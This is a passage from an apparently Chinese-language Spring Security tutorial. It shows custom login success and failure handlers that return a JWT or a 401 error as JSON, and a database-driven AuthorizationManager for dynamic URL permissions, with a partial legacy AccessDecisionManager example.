class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtUtil jwtUtil; <span class="comment">// 注入我们之前创建的 JWT 工具类</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ObjectMapper objectMapper; <span class="comment">// Spring Boot 自动配置的 Jackson ObjectMapper</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationSuccess</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                        HttpServletResponse response,</span></span><br><span class="line"><span class="params">                                        Authentication authentication)</span></span><br><span class="line">                                        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 从 Authentication 对象生成 JWT</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> jwtUtil.generateToken(authentication);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 准备要返回的 JSON 数据</span></span><br><span class="line">        Map&lt;String, Object&gt; responseData = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        responseData.put(<span class="string">&quot;code&quot;</span>, HttpStatus.OK.value());</span><br><span class="line">        responseData.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Login successful&quot;</span>);</span><br><span class="line">        responseData.put(<span class="string">&quot;token&quot;</span>, token);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 设置响应头</span></span><br><span class="line">        response.setStatus(HttpStatus.OK.value());</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将 JSON 数据写入响应体</span></span><br><span class="line">        response.getWriter().write(objectMapper.writeValueAsString(responseData));</span><br><span class="line">        response.getWriter().flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意：这里我们已经处理了响应，所以不需要再调用 filterChain.doFilter()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解读</strong>:</p>
<ul>
<li><code>onAuthenticationSuccess</code> 方法的 <code>authentication</code> 参数是<strong>已认证</strong>的 <code>Authentication</code> 对象，包含了用户的 <code>UserDetails</code> 和权限信息。</li>
<li>我们利用 <code>JwtUtil</code> 为这个已认证的用户生成一个 JWT。</li>
<li>然后构建一个包含 Token 和成功信息的 Map。</li>
<li>最后，使用 <code>ObjectMapper</code> 将 Map 序列化为 JSON 字符串，并写入 <code>HttpServletResponse</code>。</li>
</ul>
<p><strong>步骤 2: 在安全配置中应用</strong></p>
<p>将我们自定义的 Handler 应用到 <code>.formLogin()</code> 配置中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyAuthenticationSuccessHandler myAuthenticationSuccessHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">            .requestMatchers(<span class="string">&quot;/login&quot;</span>).permitAll()</span><br><span class="line">            .anyRequest().authenticated()</span><br><span class="line">        )</span><br><span class="line">        .formLogin(form -&gt; form</span><br><span class="line">            .loginProcessingUrl(<span class="string">&quot;/login&quot;</span>) <span class="comment">// 指定登录处理 URL</span></span><br><span class="line">            .successHandler(myAuthenticationSuccessHandler) <span class="comment">// ✨ 使用自定义的成功处理器</span></span><br><span class="line">            <span class="comment">// .failureHandler(...) // 稍后会添加失败处理器</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment">// ... (通常会禁用 csrf 和 session)</span></span><br><span class="line">        .csrf(csrf -&gt; csrf.disable())</span><br><span class="line">        .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，当用户通过 <code>POST /login</code> 成功登录后，他们将收到一个 JSON 响应，而不是被重定向。</p>
<hr>
<h4 id="6-3-2-AuthenticationFailureHandler-处理认证失败"><a href="#6-3-2-AuthenticationFailureHandler-处理认证失败" class="headerlink" title="6.3.2 AuthenticationFailureHandler: 处理认证失败"></a>6.3.2 <code>AuthenticationFailureHandler</code>: 处理认证失败</h4><h5 id="1-默认行为-1"><a href="#1-默认行为-1" class="headerlink" title="1. 默认行为"></a>1. 默认行为</h5><p>默认的 <code>SimpleUrlAuthenticationFailureHandler</code> 会将用户<strong>重定向</strong>到一个指定的失败 URL，通常是 <code>/login?error</code>。它还会在 Session 中存储导致失败的 <code>AuthenticationException</code>，以便在登录页面上可以显示具体的错误信息（如“密码错误”或“用户不存在”）。</p>
<hr>
<h5 id="2-为什么需要自定义？-1"><a href="#2-为什么需要自定义？-1" class="headerlink" title="2. 为什么需要自定义？"></a>2. 为什么需要自定义？</h5><p>同样，在 REST API 场景中，我们不希望重定向，而是希望返回一个包含详细错误信息的 <strong>JSON 响应</strong>，并附带一个合适的 HTTP 状态码（通常是 <code>401 Unauthorized</code>）。</p>
<hr>
<h5 id="3-实现登录失败后返回-JSON"><a href="#3-实现登录失败后返回-JSON" class="headerlink" title="3. 实现登录失败后返回 JSON"></a>3. 实现登录失败后返回 JSON</h5><p><strong>步骤 1: 创建 <code>AuthenticationFailureHandler</code> 的实现类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.AuthenticationFailureHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAuthenticationFailureHandler</span> <span class="keyword">implements</span> <span class="title class_">AuthenticationFailureHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ObjectMapper objectMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationFailure</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                        HttpServletResponse response,</span></span><br><span class="line"><span class="params">                                        AuthenticationException exception)</span></span><br><span class="line">                                        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 准备要返回的 JSON 数据</span></span><br><span class="line">        Map&lt;String, Object&gt; responseData = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        responseData.put(<span class="string">&quot;code&quot;</span>, HttpStatus.UNAUTHORIZED.value());</span><br><span class="line">        responseData.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Login failed: &quot;</span> + exception.getMessage());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 也可以根据不同的异常类型返回更具体的信息</span></span><br><span class="line">        <span class="comment">// if (exception instanceof BadCredentialsException) &#123; ... &#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置响应头</span></span><br><span class="line">        response.setStatus(HttpStatus.UNAUTHORIZED.value());</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 JSON 数据写入响应体</span></span><br><span class="line">        response.getWriter().write(objectMapper.writeValueAsString(responseData));</span><br><span class="line">        response.getWriter().flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解读</strong>:</p>
<ul>
<li><code>onAuthenticationFailure</code> 方法的 <code>exception</code> 参数是导致认证失败的具体异常，例如 <code>BadCredentialsException</code>, <code>UsernameNotFoundException</code> 等。</li>
<li>我们可以利用 <code>exception.getMessage()</code> 来获取友好的错误提示。</li>
<li>我们构建了一个包含错误信息的 JSON，并以 <code>401</code> 状态码返回给前端。</li>
</ul>
<p><strong>步骤 2: 在安全配置中应用</strong></p>
<p>将失败处理器也添加到 <code>.formLogin()</code> 配置中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyAuthenticationSuccessHandler myAuthenticationSuccessHandler;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyAuthenticationFailureHandler myAuthenticationFailureHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        .formLogin(form -&gt; form</span><br><span class="line">            .loginProcessingUrl(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">            .successHandler(myAuthenticationSuccessHandler)</span><br><span class="line">            .failureHandler(myAuthenticationFailureHandler) <span class="comment">// ✨ 使用自定义的失败处理器</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="6-4-自定义-AccessDecisionManager-AuthorizationManager-高级"><a href="#6-4-自定义-AccessDecisionManager-AuthorizationManager-高级" class="headerlink" title="6.4 自定义 AccessDecisionManager &#x2F; AuthorizationManager (高级)"></a>6.4 自定义 <code>AccessDecisionManager</code> &#x2F; <code>AuthorizationManager</code> (高级)</h3><p>标准的安全配置（如 <code>.requestMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)</code>）是<strong>静态</strong>的。这些规则在应用启动时就被硬编码在配置中。然而，在许多复杂的企业级应用中，权限需求是<strong>动态</strong>的：</p>
<ul>
<li>权限本身是在数据库中配置的，可以由管理员在运行时添加、修改或删除。</li>
<li>一个 URL 的访问权限可能不仅仅依赖于用户的角色，还可能依赖于请求的参数、当前时间、用户所属的部门等多种动态因素。</li>
</ul>
<p>为了实现这种级别的动态授权，我们需要深入到 Spring Security 的决策核心，自定义 <code>AccessDecisionManager</code> (传统架构) 或 <code>AuthorizationManager</code> (现代架构)。</p>
<h4 id="6-4-1-现代架构-自定义-AuthorizationManager"><a href="#6-4-1-现代架构-自定义-AuthorizationManager" class="headerlink" title="6.4.1 现代架构: 自定义 AuthorizationManager"></a>6.4.1 现代架构: 自定义 <code>AuthorizationManager</code></h4><p>在 Spring Security 6+ 中，<code>AuthorizationManager</code> 是推荐的、更简洁的授权决策接口。自定义它通常是实现动态授权的首选方式。</p>
<p><strong>场景</strong>: 假设我们有一个权限管理系统，数据库中有一张 <code>permission</code> 表，存储了 URL 路径与所需权限的对应关系。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> permission (</span><br><span class="line">  id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">  url <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>,      <span class="comment">-- 受保护的 URL 模式 (e.g., /api/users/**)</span></span><br><span class="line">  permission <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span> <span class="comment">-- 访问该 URL 所需的权限 (e.g., user:list)</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 一个用户-角色表，一个角色-权限表 (此处简化，权限直接关联用户)</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> user_permissions (</span><br><span class="line">  username <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">  permission <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>我们的目标是：当一个请求进来时，根据请求的 URL 从数据库中查出所需的权限，然后检查当前用户是否拥有该权限。</p>
<p><strong>步骤 1: 创建自定义 <code>AuthorizationManager</code></strong></p>
<p>我们需要创建一个类，实现 <code>AuthorizationManager&lt;RequestAuthorizationContext&gt;</code> 接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authorization.AuthorizationDecision;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authorization.AuthorizationManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.Authentication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.access.intercept.RequestAuthorizationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.AntPathMatcher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Supplier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicAuthorizationManager</span> <span class="keyword">implements</span> <span class="title class_">AuthorizationManager</span>&lt;RequestAuthorizationContext&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注入用于查询数据库的服务</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PermissionService permissionService;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AntPathMatcher</span> <span class="variable">antPathMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DynamicAuthorizationManager</span><span class="params">(PermissionService permissionService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.permissionService = permissionService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> AuthorizationDecision <span class="title function_">check</span><span class="params">(Supplier&lt;Authentication&gt; authenticationSupplier, RequestAuthorizationContext context)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 获取当前请求的 HttpServletRequest 对象</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> context.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 从数据库中查询所有已配置的 URL 权限规则</span></span><br><span class="line">        Collection&lt;Permission&gt; allPermissions = permissionService.getAllPermissions();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 遍历所有规则，找到与当前请求 URL 匹配的规则</span></span><br><span class="line">        <span class="keyword">for</span> (Permission permission : allPermissions) &#123;</span><br><span class="line">            <span class="keyword">if</span> (antPathMatcher.match(permission.getUrl(), requestUrl)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 4. 如果找到匹配规则，获取当前用户的认证信息</span></span><br><span class="line">                <span class="type">Authentication</span> <span class="variable">authentication</span> <span class="operator">=</span> authenticationSupplier.get();</span><br><span class="line">                <span class="keyword">if</span> (authentication == <span class="literal">null</span> || !authentication.isAuthenticated()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AuthorizationDecision</span>(<span class="literal">false</span>); <span class="comment">// 未认证用户直接拒绝</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 5. 检查用户是否拥有该规则所要求的权限</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">requiredPermission</span> <span class="operator">=</span> permission.getPermission();</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">hasPermission</span> <span class="operator">=</span> authentication.getAuthorities().stream()</span><br><span class="line">                        .anyMatch(grantedAuthority -&gt; grantedAuthority.getAuthority().equals(requiredPermission));</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 6. 返回决策结果</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AuthorizationDecision</span>(hasPermission);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 如果没有匹配到任何已配置的规则，可以采取默认策略</span></span><br><span class="line">        <span class="comment">// 例如，默认拒绝 (更安全)，或者允许 (如果你的系统有大量公共接口)</span></span><br><span class="line">        <span class="comment">// 这里我们选择默认拒绝未明确配置的 URL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AuthorizationDecision</span>(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>PermissionService</code> (示意)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PermissionService</span> &#123;</span><br><span class="line">    <span class="comment">// 这是一个示例，实际应从数据库查询</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;Permission&gt; <span class="title function_">getAllPermissions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 在实际应用中，这里应该有缓存以提高性能</span></span><br><span class="line">        <span class="keyword">return</span> List.of(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Permission</span>(<span class="string">&quot;/api/users/**&quot;</span>, <span class="string">&quot;user:list&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Permission</span>(<span class="string">&quot;/api/orders/**&quot;</span>, <span class="string">&quot;order:manage&quot;</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 在安全配置中使用自定义 <code>AuthorizationManager</code></strong></p>
<p>现在，我们可以在 <code>SecurityFilterChain</code> 中使用这个自定义的 <code>AuthorizationManager</code> 来保护所有请求。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> DynamicAuthorizationManager dynamicAuthorizationManager;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">            <span class="comment">// 将所有请求的授权决策委托给我们自定义的 Manager</span></span><br><span class="line">            .anyRequest().access(dynamicAuthorizationManager)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">// ... 其他配置</span></span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 <code>.anyRequest().access(dynamicAuthorizationManager)</code>，我们告诉 Spring Security：“对于任何请求，都不要使用 <code>hasRole</code>, <code>permitAll</code> 等静态规则了，直接调用我的 <code>dynamicAuthorizationManager</code> 来做决定吧！”</p>
<p><strong>优势</strong>:</p>
<ul>
<li><strong>完全动态</strong>: 现在你可以通过修改数据库中的 <code>permission</code> 表来实时地更新应用的授权规则，无需重启应用。</li>
<li><strong>逻辑集中</strong>: 所有 URL 相关的授权逻辑都集中在 <code>DynamicAuthorizationManager</code> 中，便于管理和审计。</li>
<li><strong>无限扩展</strong>: 你可以在 <code>check</code> 方法中实现任意复杂的逻辑，比如结合请求参数、请求头、当前时间等因素来做决策。</li>
</ul>
<hr>
<h4 id="6-4-2-传统架构-自定义-AccessDecisionManager-与-Voter"><a href="#6-4-2-传统架构-自定义-AccessDecisionManager-与-Voter" class="headerlink" title="6.4.2 传统架构: 自定义 AccessDecisionManager 与 Voter"></a><strong>6.4.2 传统架构: 自定义 <code>AccessDecisionManager</code> 与 <code>Voter</code></strong></h4><p>如果你正在维护一个老项目，或者需要实现更复杂的“投票”逻辑，你可能需要自定义 <code>AccessDecisionManager</code> 和 <code>Voter</code>。</p>
<p><strong>思路</strong>:</p>
<ol>
<li><strong>自定义 <code>FilterInvocationSecurityMetadataSource</code></strong>: 这个组件的职责是在 <code>AccessDecisionManager</code> 做决策之前，为它提供“决策所需的依据”（即 <code>ConfigAttribute</code>）。我们需要自定义它，让它根据请求的 URL 从数据库中查询出所需的权限，并封装成 <code>ConfigAttribute</code>。</li>
<li><strong>自定义 <code>AccessDecisionVoter</code></strong>: 创建一个 Voter，它能够理解我们自定义的 <code>ConfigAttribute</code>。它的 <code>vote</code> 方法会比较用户拥有的权限和 <code>ConfigAttribute</code> 中要求的权限。</li>
<li><strong>配置 <code>AccessDecisionManager</code></strong>: 将我们的自定义 Voter 配置到一个 <code>AccessDecisionManager</code> 中（例如 <code>AffirmativeBased</code>）。</li>
<li><strong>将它们整合到 <code>FilterSecurityInterceptor</code></strong>: 这是最终执行授权的过滤器。</li>
</ol>
<p>这个过程比自定义 <code>AuthorizationManager</code> 复杂得多，涉及的组件也更多。</p>
<p><strong>简化版自定义 <code>AccessDecisionManager</code> 示例</strong>:</p>
<p>我们也可以不使用 Voter，而是直接实现一个 <code>AccessDecisionManager</code>，将所有逻辑都放在里面。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicAccessDecisionManager</span> <span class="keyword">implements</span> <span class="title class_">AccessDecisionManager</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... (注入 PermissionService, AntPathMatcher 等)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decide</span><span class="params">(Authentication authentication, Object object, Collection&lt;ConfigAttribute&gt; configAttributes)</span> </span><br><span class="line">            <span class="keyword">throws</span> AccessDeniedException, InsufficientAuthenticationException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((FilterInvocation) object).getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... (与 DynamicAuthorizationManager 类似的逻辑) ...</span></span><br><span class="line">        <span class="comment">// 1. 查数据库，找到匹配的 requiredPermission</span></span><br><span class="line">        <span class="comment">// 2. 检查 authentication.getAuthorities() 是否包含 requiredPermission</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">boolean</span> <span class="variable">hasPermission</span> <span class="operator">=</span> ...; <span class="comment">// 检查逻辑</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!hasPermission) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(<span class="string">&quot;Access is denied.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果有权限，则方法正常返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(ConfigAttribute attribute)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 支持所有类型的 ConfigAttribute</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> 